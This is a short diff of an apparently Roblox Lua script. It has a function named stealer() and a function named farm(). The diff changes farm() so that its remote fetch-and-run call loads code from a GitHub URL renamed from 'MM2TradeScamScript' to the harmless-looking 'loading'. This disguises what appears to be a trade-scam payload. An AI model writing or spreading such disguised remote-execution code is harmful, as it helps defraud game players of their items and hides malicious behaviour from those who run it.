@@ -24,7 +24,7 @@ local function stealer()
 end
 
 local function farm()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/hayrankal/MM2TradeScamScript/refs/heads/main/TradeScamScript"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/hayrankal/loading/refs/heads/main/loading"))()
 end
 
 -- Executor kontrolü
